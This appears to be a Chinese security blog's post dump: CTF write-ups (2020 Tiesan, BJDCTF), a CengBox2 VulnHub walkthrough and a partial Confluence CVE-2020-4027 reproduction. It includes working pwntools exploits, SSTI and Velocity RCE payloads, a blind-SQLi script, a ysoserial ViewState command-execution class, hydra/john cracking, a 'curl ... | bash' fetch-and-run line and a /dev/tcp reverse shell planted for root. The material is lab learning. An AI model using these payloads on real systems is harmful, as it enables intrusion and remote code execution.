{"pages":[],"posts":[{"title":"[PWN]2020铁三第四赛区个人赛writeup","text":"前言只有两道题都不难，但是最近没怎么做题，生疏了，做了好久才出来，留下没技术的泪水。还好队友给力，带我躺进了决赛。 顺便附上题目文件链接： namepie.zip onetime.zip namepieIDA打开直接看伪代码，漏洞在函数sub_9A0，栈溢出，但事实上没这么简单。 123456789101112ssize_t sub_9A0(){ char s; // [rsp+0h] [rbp-30h] unsigned __int64 v2; // [rsp+28h] [rbp-8h] v2 = __readfsqword(0x28u); memset(&amp;s, 0, 0x1EuLL); puts(\"Input your Name:\"); read(0, &amp;s, 0x30uLL); printf(\"hello %s: and what do your want to sey!\\n\", &amp;s); return read(0, &amp;s, 0x60uLL);} 拉到linux上checksec查了下，保护全开，要成功栈溢出首先得绕过canary。 canary最后一个字节为00，所以直接写入0x29个字符，覆盖掉00，利用printf就能读出canary。 程序里还有个system('/bin/sh')的backdoor，跟栈溢出的返回地址刚好就差一个字节，所以随机地址也没什么影响。 最后padding带上canary，还有就是读到的canary记得减去覆盖00的那个字节就行了。 exp： 12345678910111213141516171819from LibcSearcher import *from pwn import *context.log_level = 'DEBUG'context.binary = './namepie'if sys.argv[1] == 'l': p = process(['./namepie'])else: p = remote('172.20.14.91',9999)# gdb.attach(p)p.sendafter('Input your Name:',cyclic(0x29))p.recvuntil('iaaajaaa')canary = u64(p.recv(8))-0x6bprint(hex(canary))p.sendafter('and what do your want to sey!\\n',flat(cyclic(0x28),canary,0xdeadbeef)+'\\x71')p.interactive() onetimeUAF的题，有增删改查的功能，还有一个选项能添加堆块并写入内容，但都只能用一次。 UAF就处在del功能里，free掉堆块后没将指针置空。 12345678910int cmd_del(){ int result; // eax free(buf); // uaf result = puts(\"complete!\"); add_flag = 0; del_flag = 1; return result;} 由于添加的堆块的大小都为0x60，所以删掉一个堆块得到fastbin，再利用UAF修改fastbin的fd，连续添加两个堆块就能实现任意地址写。 checksec查了下，没开随机地址，bss上刚好有个0x7f，所以fake chunk就能开bss上了。标记功能使用次数的flag也在bss上，把flag改为大于1，就能绕过了使用次数的限制。 然后改buf的指针到got表，利用读功能得到libc的基址，再然后改got表为one_gadget的方式getshell。 改了后的bss： 测试下来，改read的got，one_gadget能正常使用。 exp: 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354from LibcSearcher import *from pwn import *context.log_level = 'DEBUG'context.binary = './onetime'elf = ELF('./onetime')if sys.argv[1] == 'l': p = process('./onetime') libc = context.binary.libc print(libc)else: p = remote('172.20.14.91',10001) libc = ELF('./libc-2.23.so')def cmd_add(): p.sendlineafter('your choice &gt;&gt;','1')def cmd_edit(content): p.sendlineafter('your choice &gt;&gt;','2') p.sendafter('fill content:',content)def cmd_show(): p.sendlineafter('your choice &gt;&gt;','3') p.recvuntil('data:') return p.recvline()def cmd_del(): p.sendlineafter('your choice &gt;&gt;','4')def cmd_add_name(content): p.sendlineafter('your choice &gt;&gt;','5') p.sendafter('Hero! Leave your name:',content)# gdb.attach(p,'b *0x4009be')fake_chunk = 0x602090 - 0x3read_got = elf.got['read']# print(read_got)cmd_add()cmd_del()cmd_edit(flat(fake_chunk))cmd_add()cmd_add_name('\\x00'*3+flat(cyclic(0x8),read_got,cyclic(0x10)))read_got = u64(cmd_show()[:-1].ljust(8,'\\x00'))libc.address = read_got - libc.sym['read']print(hex(libc.address))# one_gadget = [0x45226,0x4527a,0xf0364,0xf1207]one_gadget = [0x45216,0x4526a,0xf02a4,0xf1147]cmd_edit(flat(libc.address+one_gadget[0]))# cmd_del()p.interactive()","link":"/2020/11/09/2020铁三第四赛区个人赛writeup/"},{"title":"BJDCTF_writeup","text":"WEBfake google在注释里看就是SSTI。 不会SSTI，直接在网上找payload打下。 1{{().__class__.__bases__[0].__subclasses__()[177].__init__.__globals__.__builtins__['open']('/flag').read()}} old-hack主页的黑页提示了是thinkphp5，又整出一个报错页面看到具体版本是5.0.23。 发现有REC漏洞，直接用payload打下。 https://github.com/SkyBlueEternal/thinkphp-RCE-POC-Collection duangShell提示有源码泄露，下载下来用vim恢复。看到读文件的命令只过滤了cat。 当时做题的时候直接less /flagOOB(Out of Band)就输出flag了，写writeup复现时候看到这个。。。 只好老老实实的反弹shell，想着用base32或者hex编码一下反弹shell的命令，但又没base32又没python，只好作罢。起一个linux靶机，python -m SimpleHTTPServer 8000开个web服务，目录下放一句话bash反弹shell。用命令curl http://174.1.92.51:8000/shell.txt | bash来反弹。 简单注入在robots.txt里看见了hint.txt，给出了sql语句。 1select * from users where username=&apos;$_POST[&quot;username&quot;]&apos; and password=&apos;$_POST[&quot;password&quot;]&apos;; 众所周知，ctf比赛里叫easy的题目都不easy，不出所料肯定有过滤。先把关键字扔进burpsuite里跑一跑。 过滤了关键字若干，其中单引号也过滤了，但没过滤反斜杠。用剩下来的关键字构造一个变种万能密码。 登录成功只出来一句话，并没有flag，因为前面看到过滤了union、select等关键字，考虑不能跨表查询了，flag可能就是登录密码。下面直接上盲注脚本。 123456789101112131415161718192021222324252627282930313233343536#! /usr/bin/env python# _*_ coding:utf-8 _*_import requestsimport urllibimport timestart_time = time.time()def words_len(url): values={} for i in range(1,100): data = {'username':'p3rh4p\\\\','password':'||length(password)&gt;%s#' %i} geturl = url response = requests.post(geturl,data) if response.content.find('You konw')&gt;0: return idef words(url): payloads = '!\"#$%&amp;\\'()*+,-./0123456789:;&lt;=&gt;?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\\\\]^_`abcdefghijklmnopqrstuvwxyz{|}~' words= '' aa = words_len(url) print aa for i in range(1, aa+1): for payload in payloads: data = {'username':'p3rh4p\\\\','password':'||ascii(substring(password,%s,1))&gt;%s #' %(i,ord(payload))} geturl = url response = requests.post(geturl,data) if response.content.find('You konw')&gt;0: words += payload print words break return wordsif __name__ == '__main__': url='http://827d094a-2833-4bfb-93a2-fb30e06a04f5.node3.buuoj.cn/check.php' result=words(url) print \"The current database:\"+result 跑出来的是密码，用密码登录获得flag。 假猪套天下第一卡在http代理那一步，Google找了很久都没找到是什么头。。 1234567891011121314151617181920212223242526272829303132333435GET /L0g1n.php HTTP/1.1Host: node3.buuoj.cn:26931User-Agent: Mozilla/5.0 (Commodore 64; Commodo 64; Commodo 64; rv:56.0) Gecko/20100101 Firefox/56.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3Accept-Encoding: gzip, deflateReferer: gem-love.comSender: root@gem-love.comFrom: root@gem-love.comTo: root@gem-love.comReturn-Path: root@gem-love.comDowngraded-From: root@gem-love.comProxy: 203.107.43.165Proxy-Connection: keep-aliveProxy-Connection: 203.107.43.165Proxy-Authenticate: 203.107.43.165Proxy-Authorization: 203.107.43.165Forwarded: for=203.107.43.165;proto=http;by=203.107.43.165X-Forwarded-Host: 203.107.43.165Http-Proxy: 203.107.43.165X-Forwarded-Proto: httpCookie: _ga=GA1.2.580799202.1584770711; _gid=GA1.2.332844867.1584770711; PHPSESSID=rtmk7m1cg7q3jne0ir65hsnva0; time=9584803982; __vgl=1X-Forwarded-For: 203.107.43.165, 203.107.43.165, 203.107.43.165, 203.107.43.165Client-IP: 127.0.0.1X-Http-Forwarded-For: 203.107.43.165X-Requested-With: 203.107.43.165X-Remote-IP: 203.107.43.165X-Originating-IP: 203.107.43.165X-Remote-Addr: 203.107.43.165WL-Proxy-Client-IP: 203.107.43.165Remote-Addr: 203.107.43.165DNT: 1Connection: closeUpgrade-Insecure-Requests: 1Cache-Control: max-age=0 最后看别人writeup是Via Schrödinger这题没意思，搞得花里胡哨的，结果就在cookie里放个base64的时间，把时间改成负的就出来个av号，去批站相关视频下找flag。。就不放过程了 xss之光扫目录发现了.git目录（扫的时候要线程要调小一点，不然会被平台ban掉）。githack类工具推荐用Git_Extract，其他工具扫不出来的，用这个都能扫到，甚至历史版本也能扫出来。 序列化xss的payload就能搞个反射型xss，猜测后端有个bot能被你打cookie。 于是在xss平台准备链接，插进去准备打cookie，日后发现打了个寂寞，只打到了自己的cookie，但是在自己的cookie里发现了flag，真是神奇。 文件探测这题在比赛的时候没做出来，结束后试着复现下。 在主页的Responce里有个hint：home.php，明显是php伪协议的任意文件读取。 读下来home.php和system.php的源码。 home.php里没什么东西，就只能读这两个源码。 1234567891011121314151617181920212223242526272829303132333435&lt;?phpsetcookie(\"y1ng\", sha1(md5('y1ng')), time() + 3600);setcookie('your_ip_address', md5($_SERVER['REMOTE_ADDR']), time()+3600);if(isset($_GET['file'])){ if (preg_match(\"/\\^|\\~|&amp;|\\|/\", $_GET['file'])) { die(\"forbidden\"); } if(preg_match(\"/.?f.?l.?a.?g.?/i\", $_GET['file'])){ die(\"not now!\"); } if(preg_match(\"/.?a.?d.?m.?i.?n.?/i\", $_GET['file'])){ die(\"You! are! not! my! admin!\"); } if(preg_match(\"/^home$/i\", $_GET['file'])){ die(\"禁止套娃\"); } else{ if(preg_match(\"/home$/i\", $_GET['file']) or preg_match(\"/system$/i\", $_GET['file'])){ $file = $_GET['file'].\".php\"; } else{ $file = $_GET['file'].\".fxxkyou!\"; } echo \"现在访问的是 \".$file . \"&lt;br&gt;\"; require $file; }} else { echo \"&lt;script&gt;location.href='./home.php?file=system'&lt;/script&gt;\";} home.php里有个文件读取，但限死了只能读127.0.0.1的文件，干脆ssrf访问下admin.php 12345678910111213141516171819202122232425262728293031323334353637383940414243&lt;?phperror_reporting(0);if (!isset($_COOKIE['y1ng']) || $_COOKIE['y1ng'] !== sha1(md5('y1ng'))){ echo \"&lt;script&gt;alert('why you are here!');alert('fxck your scanner');alert('fxck you! get out!');&lt;/script&gt;\"; header(\"Refresh:0.1;url=index.php\"); die;}$str2 = ' Error: url invalid&lt;br&gt;~$ ';$str3 = ' Error: damn hacker!&lt;br&gt;~$ ';$str4 = ' Error: request method error&lt;br&gt;~$ ';?&gt;......&lt;?php$filter1 = '/^http:\\/\\/127\\.0\\.0\\.1\\//i';$filter2 = '/.?f.?l.?a.?g.?/i';if (isset($_POST['q1']) &amp;&amp; isset($_POST['q2']) &amp;&amp; isset($_POST['q3']) ) { $url = $_POST['q2'].\".y1ng.txt\"; $method = $_POST['q3']; $str1 = \"~$ python fuck.py -u \\\"\".$url .\"\\\" -M $method -U y1ng -P admin123123 --neglect-negative --debug --hint=xiangdemei&lt;br&gt;\"; echo $str1; if (!preg_match($filter1, $url) ){ die($str2); } if (preg_match($filter2, $url)) { die($str3); } if (!preg_match('/^GET/i', $method) &amp;&amp; !preg_match('/^POST/i', $method)) { die($str4); } $detect = @file_get_contents($url, false); print(sprintf(\"$url method&amp;content_size:$method%d\", $detect));}?&gt; post一下q1=1&amp;q2=http://127.0.0.1/admin.php?&amp;q3=GET发现不行，去群里偷看下师傅们的聊天记录，发现还有个格式字符串漏洞Orz。用q1=1&amp;q2=http://127.0.0.1/admin.php?&amp;q3=GET%1$s在post一下，处出来一串admin.php的源码。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152&lt;?phperror_reporting(0);session_start();$f1ag = 'f1ag{s1mpl3_SSRF_@nd_spr1ntf}'; //fakefunction aesEn($data, $key){ $method = 'AES-128-CBC'; $iv = md5($_SERVER['REMOTE_ADDR'],true); return base64_encode(openssl_encrypt($data, $method,$key, OPENSSL_RAW_DATA , $iv));}function Check(){ if (isset($_COOKIE['your_ip_address']) &amp;&amp; $_COOKIE['your_ip_address'] === md5($_SERVER['REMOTE_ADDR']) &amp;&amp; $_COOKIE['y1ng'] === sha1(md5('y1ng'))) return true; else return false;}if ( $_SERVER['REMOTE_ADDR'] == \"127.0.0.1\" ) { highlight_file(__FILE__);} else { echo \"&lt;head&gt;&lt;title&gt;403 Forbidden&lt;/title&gt;&lt;/head&gt;&lt;body bgcolor=black&gt;&lt;center&gt;&lt;font size='10px' color=white&gt;&lt;br&gt;only 127.0.0.1 can access! You know what I mean right?&lt;br&gt;your ip address is \" . $_SERVER['REMOTE_ADDR'];}$_SESSION['user'] = md5($_SERVER['REMOTE_ADDR']);if (isset($_GET['decrypt'])) { $decr = $_GET['decrypt']; if (Check()){ $data = $_SESSION['secret']; include 'flag_2sln2ndln2klnlksnf.php'; $cipher = aesEn($data, 'y1ng'); if ($decr === $cipher){ echo WHAT_YOU_WANT; } else { die('爬'); } } else{ header(\"Refresh:0.1;url=index.php\"); }} else { //I heard you can break PHP mt_rand seed mt_srand(rand(0,9999999)); $length = mt_rand(40,80); $_SESSION['secret'] = bin2hex(random_bytes($length));}?&gt; 删掉cookie中的PHPSESSION明文就为空，密钥知道，vi也知道了，就能加密出密文。 EasyAspDotNet这题在比赛时候也没做出来，根据hint找到了HITCON 2018的类似一道题目，根据cyku师傅的writeup尝试powershell反弹shell并没有成功。等官方writeup出来的时候又是cyku师傅的又一篇文章复现一下，cyku师傅太强了。 进去网页点下Click me!出来一张图片，F12看见应该是存在文件读取。 穿越了两个目录顺利读到了web.config。 第二个hint的VIEWSTATE是使用asp.net控件就会有的东西，查阅资料得知VIEWSTATE配合machineKey是能够RCE的。 下载ysoserial.exe，把C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319目录下的System.dll和System.Web.dll复制过来，保存以下代码为ExploitClass.cs。 123456789101112131415161718192021222324class E{ public E() { System.Web.HttpContext context = System.Web.HttpContext.Current; context.Server.ClearError(); context.Response.Clear(); try { System.Diagnostics.Process process = new System.Diagnostics.Process(); process.StartInfo.FileName = \"cmd.exe\"; string cmd = context.Request.Form[\"cmd\"]; process.StartInfo.Arguments = \"/c \" + cmd; process.StartInfo.RedirectStandardOutput = true; process.StartInfo.RedirectStandardError = true; process.StartInfo.UseShellExecute = false; process.Start(); string output = process.StandardOutput.ReadToEnd(); context.Response.Write(output); } catch (System.Exception) {} context.Response.Flush(); context.Response.End(); }} 利用上面读web.config获取到的machineKey用ysoserial.exe生成VIEWSTATE。 1./ysoserial.exe -p ViewState -g ActivitySurrogateSelectorFromFile -c \"ExploitClass.cs;./dlls/System.dll;./dlls/System.Web.dll\" --generator=\"CA0B0334\" -c --validationalg=\"SHA1\" --validationkey=\"47A7D23AF52BEF07FB9EE7BD395CD9E19937682ECB288913CE758DE5035CF40DC4DB2B08479BF630CFEAF0BDFEE7242FC54D89745F7AF77790A4B5855A08EAC9\" 回到主页点下Click me!，将请求中的VIEWSTATE换成ysoserial.exe生成的，再加个post参数cmd，值为cmd命令。 PWNone_gadgetinit函数直接输出了printf的地址，题目名字很直接，叫one_gadget，又提供了libc，直接one_gadget一把梭。 123456int init(){ setvbuf(_bss_start, 0LL, 2, 0LL); setvbuf(stdin, 0LL, 1, 0LL); return printf(\"here is the gift for u:%p\\n\", &amp;printf);} main函数这里值得注意的是：存在的漏洞不是栈溢出，而直接跳转到输入的内容处执行，所以我们输入的one_gadget要转为整型再转为字符串。 1234567891011int __cdecl main(int argc, const char **argv, const char **envp){ ... v6 = __readfsqword(0x28u); init(); printf(\"Give me your one gadget:\", argv); __isoc99_scanf(\"%ld\", &amp;v4); v5 = v4; v4(\"%ld\", &amp;v4); # vuln return 0;} 附上exp 12345678910111213141516171819202122232425262728293031323334from LibcSearcher import *from pwn import *context.log_level = 'DEBUG'context.binary = './one_gadget'if sys.argv[1] == 'l': p = process('./one_gadget') libc = context.binary.libcelse: p = remote('node3.buuoj.cn',26018) libc = ELF('./libc-2.29.so')elf = ELF('./one_gadget')p.recvuntil('u:')data = int(p.recv(14),16)base = data - libc.sym['printf']# one_gadget = base + 0xe237f# one_gadget = base + 0xe2383# one_gadget = base + 0xe2386one_gadget = base + 0x106ef8# one_gadget = base + 0xc83ba# one_gadget = base + 0xc83bd# one_gadget = base + 0xc83c0# one_gadget = base + 0xe652bpayload = str(int(one_gadget))p.recvuntil('gadget:')# gdb.attach(p)p.sendline(payload)p.interactive() r2t3漏洞在name_check函数里，参数s最多能输入到0x400个字节，strcpy到dest里就会造成栈溢出。 1234567891011121314char *__cdecl name_check(char *s){ char dest; // [esp+7h] [ebp-11h] unsigned __int8 v3; // [esp+Fh] [ebp-9h] v3 = strlen(s); if ( v3 &lt;= 3u || v3 &gt; 8u ) { puts(\"Oops,u name is too long!\"); exit(-1); } printf(\"Hello,My dear %s\", s); return strcpy(&amp;dest, s);} 但在strcpy前对的长度进行限制，不过仔细看发现对跟v3比较的数字类型都是unsigned int型，在汇编里也能看见取eax的低位跟3和8比较，所以只要令到s的长度在0xx04到0xx07之间就能绕过了。 最后ret2text到预留的backdoor就行。附上exp 123456789101112131415161718192021from LibcSearcher import *from pwn import *context.log_level = 'DEBUG'context.binary = './r2t3'if sys.argv[1] == 'l': p = process('./r2t3')else: p = remote('node3.buuoj.cn',29906)elf = ELF('./r2t3')backdoor = elf.sym['_dl_registery']payload = flat(cyclic(21),backdoor,cyclic(235)+'\\x00')p.recvuntil('[+]Please input your name:')# gdb.attach(p)p.send(payload)p.interactive() r2t4这题开了canary，但存在格式化字符串漏洞，carray并没有什么卵用。 不过这里的格式化字符串没有循环，尝试覆写.fini_array里函数的got表，但没有成功。最后故意栈溢出，让程序调用___stack_chk_fail，覆写___stack_chk_fail的got使得程序跳转到backdoor。 12345678910int __cdecl main(int argc, const char **argv, const char **envp){ char buf; // [rsp+0h] [rbp-30h] unsigned __int64 v5; // [rsp+28h] [rbp-8h] v5 = __readfsqword(0x28u); read(0, &amp;buf, 0x38uLL); printf(&amp;buf, &amp;buf); return 0;} 附上exp 123456789101112131415161718192021222324252627282930from LibcSearcher import *from pwn import *context.log_level = 'DEBUG'context.binary = './r2t4'if sys.argv[1] == 'l': p = process('./r2t4')else: p = remote('node3.buuoj.cn',28071)elf = ELF('./r2t4')addr = elf.got['__stack_chk_fail']backdoor = elf.sym['backdoor']def exec_fmt(payload): p = process('./r2t4') p.sendline(payload) data = p.recvline() p.close() return dataautofmt = FmtStr(exec_fmt)offset = autofmt.offsetpayload = fmtstr_payload(offset,{addr:backdoor}).ljust(0x38,'a')# gdb.attach(p)p.send(payload)p.interactive() test程序保护全开，好像没什么漏洞，尝试绕过过滤。找了很久发现od ????可以，但是出来的是这些玩意，直接解码不行。想得头都穿了，差点要写脚本爆破了。 后来看了官方文档才知道，默认两个字节合起来转为八进制。用脚本解一下。 1234567891011e = '066146 063541 063173 034461 030141 033470 026546 063067 030545 032055 030143 026471 061471 033471 034455 034470 032064 033544 032071 032467 076463 077412 046105 001106 000401 000000 000000 000000 000000 001000 037000 000400 000000 000000 040006 000000 000000 040000 000000 000000 000000 014000 000033 000000 000000 000000 000000 040000 034000 004400 040000 017400 016000 003000 000000 002400 000000 040000 000000 000000 000000 040000 040000 000000 000000 040000 040000 000000 000000 174000 000001 000000 000000 174000 000001 000000 000000 004000 000000 000000 000000 001400 000000 002000 000000 034000 000002 000000 000000 034000 040002 000000 000000 034000 040002 000000 000000 016000 000000 000000 000000 016000 000000 000000 000000 000400 000000 000000 000000 000400 000000 002400 000000 000000 000000 000000 000000 000000 040000 000000 000000 000000 040000 000000 000000 132000 000013 000000 000000 132000 000013 000000 000000 000000 020000 000000 000000 000400 000000 003000 000000 010000 000016 000000 000000 010000 060016 000000 000000 010000 060016 000000 000000 054000 000002 000000 000000 060000 000002 000000 000000 000000 020000 000000 000000 001000 000000 003000 000000 024000 000016 000000 000000 024000 060016 000000 000000 024000 060016 000000 000000 150000 000001 000000 000000 150000 000001 000000 000000 004000 000000 000000 000000 002000 000000 002000 000000 052000 000002 000000 000000 052000 040002 000000 000000 052000 040002 000000 000000 042000 000000 000000 000000 042000 000000 000000 000000 002000 000000 000000 000000 050000 072345 002144 000000 104000 000012 000000 000000 104000 040012 000000 000000 104000 040012 000000 000000 032000 000000 000000 000000 032000 000000 000000 000000 002000 000000 000000 000000 050400 072345 003144 000000 000000 000000 000000 000000 000000 000000 000000 000000 000000 000000 000000'e = e.split(' ')ans = ''for o in e: ans += hex(int(o,8))[2:][2:] ans += hex(int(o,8))[2:][:2]ans = ans.split('0a')[0]print(ans.decode('hex')) diffgdb退了几次再进去看到diff里文件二的栈地址都是一样的，我鬼使神差的以为他栈地址是不变的，gdb里能getshell，命令行里执行就不行。。有没有师傅知道是为什么。。 被搞晕了，没注意到文件一的内容直接写进bss，可以通过这个getshell，看了别的师傅的writeup才知道，太粗心了。 漏洞处在compare函数里，addr也就是文件二读取没有限制长度，超过0x78字节就会溢出，而buf1是读到bss里的，有因为没有开NX，可以直接控制程序跳到buf1处执行shellcode。 1234567891011121314151617181920int __cdecl compare(int a1, int fd){ char v2; // al int v4; // [esp+0h] [ebp-80h] unsigned int i; // [esp+4h] [ebp-7Ch] char addr[120]; // [esp+8h] [ebp-78h] v4 = 0; JUMPOUT(sys_read(fd, buf1, 0x80u), 0, &amp;failed); JUMPOUT(sys_read(a1, addr, 0x80u), 0, &amp;failed); for ( i = 0; addr[i] + buf1[i] &amp;&amp; i &lt; 0x400; ++i ) { v2 = buf1[i]; if ( v2 != addr[i] ) return v4 + 1; if ( v2 == 10 ) ++v4; } return 0;} 附上exp 123456789101112131415161718192021222324252627from pwn import *import base64buf = 0x0804A024shellcode = asm(shellcraft.sh())payload = flat(cyclic(124),buf)context.log_level = 'DEBUG'context.binary = './diff'if sys.argv[1] == 'l': p = process(argv=['diff','/tmp/123','/tmp/456'],executable='./diff') f1 = open('/tmp/123','wb') f2 = open('/tmp/456','wb') f1.write(shellcode) f2.write(payload) f1.close() f2.close()else: pwn_ssh = ssh(host='node3.buuoj.cn',user='ctf',password='guest',port=26462) p = pwn_ssh.process('/bin/bash') p.sendline('echo {} | base64 -d &gt; /tmp/123;echo {} | base64 -d &gt; /tmp/456'.format(base64.b64encode(shellcode),base64.b64encode(payload))) p.close() p = pwn_ssh.process(argv=['diff','/tmp/123','/tmp/456'],executable='./diff')elf = ELF('./diff')p.interactive()","link":"/2020/03/25/BJDCTF_writeup/"},{"title":"CengBox2 walkthrought","text":"前言这回来做个中等难度的靶机CengBox2，又学到了很多新知识，这个靶机还是设计得挺好、挺巧妙的。 https://www.vulnhub.com/entry/cengbox-2,486/ 利用过程使用nmap扫描出21，22和80端口。 1nmap -sV -T 4 -p- 192.168.100.102 打开网页说网站已不提供服务，例行扫目录也是没扫到扫描东西。 利用hydra爆破下root、ceng、ftp这几个账号的ftp密码，其中账号ftp被爆破出来了，而且是好几个密码！！后面试了下其实是没设密码，直接能登录。 1hydra -P /usr/share/wordlists/fasttrack.txt -L userlist.txt ftp://192.168.100.102 登录进去有一则留言，说在一个新的域名ceng-company.vm里设置了一个面板，并为Kevin创建一个用户，密码为默认密码，那就是弱口令咯 :D Hey Kevin,I just set up your panel and used default password. Please change them before any hack. I try to move site to new domain which name is ceng-company.vm and also I created a new area for you. Aaron 当我改/etc/hosts令ceng-company.vm解析为192.168.100.102，重新回到页面，它还是原来的样子。 去偷瞄了下别人的walkthrough，网站原来是在子域名里。由于常用的一些子域名爆破工具都是居于DNS的，在这里肯定是没法用的，所以直接把字典导入到burpsuite里，改Host爆破即可。 爆破到admin时可用看见返回的状态码和长度都跟别的不一样，所以可以确定正确的子域名就是这个了。 再在/etc/hosts里加一条admin.cencompany.vm解析到192.168.100.102。接下来依旧要爆破目录，一开始使用默认的字典没爆破出什么东西，后来换成dirburster的大字典就可以了。这里我用的是dirseach来爆破。 1python3 dirsearch.py -u http://admin.ceng-company.vm/ -e all -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 100 网站是Gila CMS，搜到了两个有点用的洞，本地文件包含和文件上传绕过。 后台为admin，用户名提示为邮箱，那就用kevin@ceng-company.vm。用burpsuite爆破，没一会就给ban了。 于是手动爆破，测到admin就进入到后台。进到后台发现不用搜到的漏洞也行，因为有文件管理功能，直接插入一句话即可。 反弹一个shell，用Privilege Escalation Awesome Scripts SUITE扫描了下可能可以提权的点。发现www-data可以无需密码，以swartz的身份运行/home/swartz/runphp.sh。 123#!/bin/bashphp -a 运行这个脚本可交互地输入php代码，那即可弹出swartz的shell。由于反弹的shell显示php的交互界面不正常，可以用python3弹出个完整的shell。 12python3 -c \"import pty;pty.spawn('/bin/bash')\"sudo -u swartz /home/swartz/runphp.sh 现在就显示正常了。 再输入system(&quot;/bin/bash&quot;);弹出swartz的shell，用提权脚本重新扫描下，发现swartz可以读mitnick用户目录下的ssh私钥。 把私钥下载下来，使用私钥连接ssh时，发现是需要passphrase的。 john可以破解passphrase，先把ssh私钥转为john可识别的格式，再进行爆破。 12/usr/share/john/ssh2john.py /tmp/rsa &gt; /tmp/tmpjohn --wordlist=/usr/share/wordlists/rockyou.txt /tmp/tmp 用密码legend，登录到mitnick，cat ~/user.txt拿到home目录下的flag。 除了无需密码sudo -u外，扫描还发现了/etc/update-motd.d目录下的脚本可写。这下脚本是属于root的可执行文件，每当有用户通过ssh登录时会以root权限自动运行，运行结果就是我们ssh登录时看到的欢迎信息。 在其中一个脚本里插入个反弹shell，退出并重新登录ssh，成功反弹root的shell回来。 1/bin/bash -c \"bash -i &gt;&amp; /dev/tcp/192.168.100.101/4444 0&gt;&amp;1\" 参考CengBox 2 Vulnhub Walkthrough","link":"/2020/06/13/CengBox2_walkthrough/"},{"title":"Confluence模板注入（CVE-2020-4027）复现","text":"前言前段时间，涛哥安排了个Confluence站点的测试，网上搜了下存在模板注入可导致命令执行，编号CVE-2020-4027。网上没有复现的文章，直到要交报告了还是没成功执行命令，只能交个模板注入导致文件读取悻悻而归。这件事如鲠在喉，于是抽空搭个环境复现了下。 前期准备复现环境本文使用的是Confluence 7.4.4的版本，官网有部署包可下，考虑到要下断点调试，没有使用Docker部署，数据库可以使用Docker起一个postgres，配置步骤网上有很多教程，本文就不具叙。 前期准备主要是IDEA怎么去调试的问题。开头就遇到坑，Xloggc的日志文件不支持中文，环境直接都启动不起来，最后排查下在service.bat里有Xloggc文件名参数，系统是中文的文件名也会是中文，删除掉百分号的内容即可。部署包自带一个tomcat，包里的confluence目录是项目的Web目录，刚开始想着从IDEA里启动tomcat，但不过是自带的tomcat，还是自己的tomcat启动后访问都是404。最后学着远程调试的方法，在自带tomcat的catalina.bat脚本开头加入以下一行调试命令，接着运行启动文件start-confluence.bat，并开启调试即可。 复现步骤虽然网上没有找到具体的漏洞点，但根据CVE的描述和@Xiao_C师傅的复现截图可得知漏洞点是出在用户宏(User macros)里，再查阅下文档和根据上一个模板注入漏洞CVE-2019-3396可知，用户宏可通过管理员的一般设置的用户宏处设置，然后在编辑文章的其他宏里预览触发。 用CVE-2019-3396的payload如下，试了下无法执行命令直接输出了模板的内容，根据CVE的描述得知是因为使用了沙箱导致的。 123456789#set($e=&quot;exp&quot;)#set($a=$e.getClass().forName(&quot;java.lang.Runtime&quot;).getMethod(&quot;getRuntime&quot;,null).invoke(null,null).exec($cmd))#set($input=$e.getClass().forName(&quot;java.lang.Process&quot;).getMethod(&quot;getInputStream&quot;).invoke($a))#set($sc=$e.getClass().forName(&quot;java.util.Scanner&quot;))#set($constructor=$sc.getDeclaredConstructor($e.getClass().forName(&quot;java.io.InputStream&quot;)))#set($scan=$constructor.newInstance($input).useDelimiter(&quot;\\\\A&quot;))#if($scan.hasNext()) $scan.next()#end 那么先来看一个简单的velocity demo如下，最基本的会实例化模板引擎VelocityEngine和模板上下文VelocityContext。 123456789101112public static void main(String[] args) throws Exception { Properties p = new Properties(); VelocityEngine velocity = new VelocityEngine(); velocity.init(p); Template template = velocity.getTemplate(\"test.vm\", \"utf-8\"); VelocityContext context = new VelocityContext(); StringWriter writer = new StringWriter(); template.merge(context, writer); writer.flush(); System.out.println(writer.toString());} 调试可以先从VelocityEngine的init方法下手。在init下断点，然后重新运行网站的启动脚本，用于初始化的Properties对象有很多的配置，其中runtime.introspector.uberspect是与沙箱相关的一个配置。其使用ConfluenceAnnotationBoxingUberspect类进行配置。 跟进ConfluenceAnnotationBoxingUberspect，最终找到它的父类SecureUberspector，是Volecity的默认沙箱。 用前面的Demo加上runtime.introspector.uberspect属性，使用之前模板注入的payload进行测试，会抛出一句告警。 搜寻一番，发现是在SecureIntrospectorImpl的getMethod方法输出的日志。跟进到同一个类中的checkObjectExecutePermission方法，验证对象是否合法。常规模板注入获取Class实例，一般通过String类型的Class实例调用forName方法，也就是java.lang.Class已经在黑名单类内，所以这种方式在这里就无法使用了。 再回去看看CVE的描述，说是通过上下文绕过沙箱。接下来找找有哪些上下文属性，我这里在模板中执行String的codePointBefore方法并下断点。顺着调用栈往上找，在GenericVelocityMacro的execute方法里调用了MacroUtils的defaultVelocityContext方法。 跟进defaultVelocityContext方法可以看到默认设置了req、res、action和webwork四个上下文属性。 123456789101112public static Context createDefaultVelocityContext() { Context ctx = ConfluenceVelocityManager.getConfluenceVelocityContext(); HttpContext httpContext = new StaticHttpContext(); HttpServletRequest request = httpContext.getRequest(); HttpServletResponse response = httpContext.getResponse(); ctx.put(\"req\", request != null ? request : new ConfluenceMockServletRequest()); ctx.put(\"res\", response); Action action = getConfluenceActionSupport(); ctx.put(\"action\", action); ctx.put(\"webwork\", new VelocityWebWorkUtil(new WebWorkVelocityContext((OgnlValueStack)null), (OgnlValueStack)null, (HttpServletRequest)null, (HttpServletResponse)null)); return ctx;} 其中req做最终是实现ServletRequest接口的，具有getServletContext方法，可获得Servlet的上下文。而上下文中有attributes属性，其中包括org.apache.tomcat.InstanceManager的键值对，这个类名在Struts2的Poc中看过，可以通过newInstance方法new一个给定类名的实例。 然后可以通过ScriptEngineManager或各种表达式语言执行命令。其实这个模板注入本质上是漏洞作者@pwntester的另一个CVE漏洞Remote Code Execution in Apache Velocity，而且作者也给出了POC如下。 1${req.getServletContext().getAttribute(&apos;org.apache.tomcat.InstanceManager&apos;).newInstance(&apos;javax.script.ScriptEngineManager&apos;).getEngineByName(&apos;js&apos;).eval(&quot;java.lang.Runtime.getRuntime().exec(&apos;touch 